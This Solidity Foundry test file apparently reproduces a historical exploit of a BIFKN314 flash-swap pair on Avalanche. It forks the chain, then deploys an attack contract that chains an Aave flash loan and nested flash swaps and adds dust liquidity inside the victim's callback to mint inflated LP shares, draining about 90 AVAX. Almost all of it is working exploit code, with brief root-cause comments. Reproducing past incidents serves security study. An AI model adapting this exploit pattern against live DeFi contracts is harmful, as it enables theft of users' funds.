// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,422.73 USD
// Attacker : https://snowtrace.io/address/0x13459bc2db6053524881415321667d5e16f5f15c
// Attack Contract : https://snowtrace.io/address/0x346a89f7f5b42b67fc66ef4b3fb816a2a8bce552
// Vulnerable Contract : https://snowtrace.io/address/0x5b5913eec2031c9d8383e3afcfd269217e481ce1
// Attack Tx : https://snowtrace.io/tx/0xab813aeecd174d51a9f6d7d0eb9b323bccedba6c5cce0e965781a08f3473dbd5

// @Info
// Vulnerable Contract Code : https://snowtrace.io/address/0x5b5913eec2031c9d8383e3afcfd269217e481ce1#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1559
//
// Attack summary: the attacker borrowed WAVAX from Aave and pair tokens from a RadioShack pair, unwrapped
// WAVAX to AVAX, used the BIFKN314 flashSwap to take AVAX and victim tokens, minted oversized LP shares
// with a dust addLiquidity call during the callback, burned the inflated LP position, minted the small
// pair-token fee needed for repayment, and kept the AVAX profit.
// Root cause: BIFKN314 flashSwap checks repayment only after BIFKN314CALL, so addLiquidity can run while
// pool balances are distorted by the flash-swap outputs and mint far more LP shares than the dust
// contribution should receive. This tx also depended on the attacker EOA being allowlisted as tx.origin
// for the unverified pair token transfer gate.

interface IBIFKN314PairVictim {
    function addLiquidity(
        uint256 amountToken,
        address recipient,
        uint256 deadline
    ) external payable returns (uint256 liquidity);
    function flashSwap(
        address recipient,
        uint256 amountNativeOut,
        uint256 amountTokenOut,
        bytes calldata data
    ) external;
    function removeLiquidity(
        uint256 amount,
        address recipient,
        uint256 deadline
    ) external returns (uint256 nativeAmount, uint256 tokenAmount);
    function getReserves() external view returns (uint256 amountNative, uint256 amountToken);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IMintableERC20 {
    function mint(
        address account,
        uint256 amount
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x13459bC2Db6053524881415321667d5E16F5F15C;
    address private constant PAIR_TOKEN = 0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69;
    uint256 private constant PAIR_TOKEN_ALLOWLIST_SLOT = 6;
    uint256 private constant FORK_BLOCK = 66_181_042;
    uint256 private constant MIN_AVAX_PROFIT = 90 ether;

    function setUp() public {
        // step 1: fork before the attack transaction and configure the profit asset.
        vm.createSelectFork("avalanche", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7, "WAVAX");
        vm.label(0x794a61358D6845594F94dc1DB02A252b5b4814aD, "Aave v3 pool");
        vm.label(0x3652E58bC41341B0026334AC20C2948E18c23136, "RadioShack pair");
        vm.label(PAIR_TOKEN, "pair token1");
        vm.label(0x5B5913EeC2031c9D8383e3afCfd269217E481ce1, "BIFKN314 victim");
        vm.label(0xd4C6BA250bFF38218937422d7aCCf55552916558, "BIFKN314 LP token");
    }

    function testExploit() public balanceLog {
        uint256 beforeBalance = ATTACKER.balance;
        // step 2: assert the pair-token allowlist precondition used by the historical tx.origin.
        bytes32 attackerAllowlistSlot = keccak256(abi.encode(ATTACKER, PAIR_TOKEN_ALLOWLIST_SLOT));
        assertEq(
            uint256(vm.load(PAIR_TOKEN, attackerAllowlistSlot)),
            1,
            "attacker tx.origin is not pair-token allowlisted"
        );

        vm.startPrank(ATTACKER, ATTACKER);
        AvaxBIFKNPairExploit exploit = new AvaxBIFKNPairExploit(ATTACKER);
        // step 3: run the attacker-controlled exploit and forward AVAX profit to the attacker.
        exploit.execute();
        vm.stopPrank();

        // step 10: assert meaningful AVAX profit without overfitting exact trace dust.
        assertGt(ATTACKER.balance - beforeBalance, MIN_AVAX_PROFIT, "insufficient AVAX profit");
    }
}

contract AvaxBIFKNPairExploit {
    IAaveFlashloan public constant AAVE_POOL = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IWETH public constant WAVAX = IWETH(payable(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7));
    IUniswapV2Pair public constant PAIR = IUniswapV2Pair(0x3652E58bC41341B0026334AC20C2948E18c23136);
    IERC20 public constant PAIR_TOKEN = IERC20(0xDd2e3B6F09a28e87c286Da081a7E244101a0FE69);
    IBIFKN314PairVictim public constant VICTIM = IBIFKN314PairVictim(0x5B5913EeC2031c9D8383e3afCfd269217E481ce1);
    IERC20 public constant LP_TOKEN = IERC20(0xd4C6BA250bFF38218937422d7aCCf55552916558);

    uint256 private constant FLASH_WAVAX_AMOUNT = 1000 ether;
    uint256 private constant FLASH_BORROW_BPS = 9990;
    uint256 private constant PAIR_FLASH_FEE_BPS = 50;
    uint256 private constant BIFKN_NATIVE_REPAY_BPS = 40;
    uint256 private constant BPS = 10_000;
    uint256 private constant DUST_LIQUIDITY_DIVISOR = 1000;

    address private immutable profitRecipient;

    constructor(
        address recipient
    ) {
        profitRecipient = recipient;
    }

    function execute() external {
        // step 4: borrow WAVAX from Aave and enter the nested pair/victim flash swaps.
        AAVE_POOL.flashLoanSimple(address(this), address(WAVAX), FLASH_WAVAX_AMOUNT, "", 0);

        uint256 profit = address(this).balance;
        (bool success,) = payable(profitRecipient).call{value: profit}("");
        require(success, "profit transfer failed");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_POOL), "unexpected lender");
        require(initiator == address(this), "unexpected initiator");
        require(asset == address(WAVAX), "unexpected flash asset");
        require(amount == FLASH_WAVAX_AMOUNT, "unexpected flash amount");
        require(premium > 0, "unexpected premium");

        // step 5: borrow pair tokens through the RadioShack flash-swap callback.
        uint256 pairTokenBorrow = PAIR_TOKEN.balanceOf(address(PAIR)) / 2;
        PAIR.swap(0, pairTokenBorrow, address(this), "flash");

        // step 9: wrap AVAX and approve Aave repayment after the nested flash swaps settle.
        uint256 repayAmount = amount + premium;
        WAVAX.deposit{value: repayAmount}();
        WAVAX.approve(address(AAVE_POOL), repayAmount);

        return true;
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0Out,
        uint256 amount1Out,
        bytes calldata
    ) external {
        require(msg.sender == address(PAIR), "unexpected pair");
        require(sender == address(this), "unexpected pair sender");
        require(amount0Out == 0, "unexpected token0 out");
        require(amount1Out > 0, "unexpected token1 out");

        // step 6: unwrap WAVAX and trigger the vulnerable BIFKN314 flash swap.
        WAVAX.withdraw(FLASH_WAVAX_AMOUNT);

        (uint256 nativeReserve, uint256 tokenReserve) = VICTIM.getReserves();
        uint256 nativeOut = (nativeReserve * FLASH_BORROW_BPS) / BPS;
        uint256 tokenOut = (tokenReserve * FLASH_BORROW_BPS) / BPS;
        VICTIM.flashSwap(address(this), nativeOut, tokenOut, "");

        // step 8: burn inflated LP shares, mint the pair-token fee, and repay the pair flash swap.
        uint256 lpBalance = LP_TOKEN.balanceOf(address(this));
        LP_TOKEN.approve(address(VICTIM), lpBalance);
        VICTIM.removeLiquidity(lpBalance, address(this), block.timestamp + 3 minutes);

        uint256 pairTokenFee = (amount1Out * PAIR_FLASH_FEE_BPS) / BPS;
        IMintableERC20(address(PAIR_TOKEN)).mint(address(this), pairTokenFee);
        PAIR_TOKEN.transfer(address(PAIR), amount1Out + pairTokenFee);
    }

    function BIFKN314CALL(
        address sender,
        uint256 amountNativeOut,
        uint256 amountTokenOut,
        bytes calldata
    ) external {
        require(msg.sender == address(VICTIM), "unexpected flash-swap caller");
        require(sender == address(this), "unexpected flash-swap sender");
        require(amountNativeOut > 0, "unexpected native out");
        require(amountTokenOut > 0, "unexpected token out");

        // step 7: add dust liquidity while balances are distorted, then repay the victim flash swap.
        uint256 liquidityAmount = amountNativeOut / DUST_LIQUIDITY_DIVISOR;
        uint256 minted =
            VICTIM.addLiquidity{value: liquidityAmount}(liquidityAmount, address(this), block.timestamp + 3 minutes);
        require(minted > liquidityAmount, "liquidity inflation did not occur");

        uint256 nativeRepay = amountNativeOut + ((amountNativeOut * BIFKN_NATIVE_REPAY_BPS) / BPS);
        (bool success,) = payable(address(VICTIM)).call{value: nativeRepay}("");
        require(success, "native flash-swap repayment failed");

        VICTIM.transfer(address(VICTIM), amountTokenOut - liquidityAmount);
    }

    receive() external payable {}
}
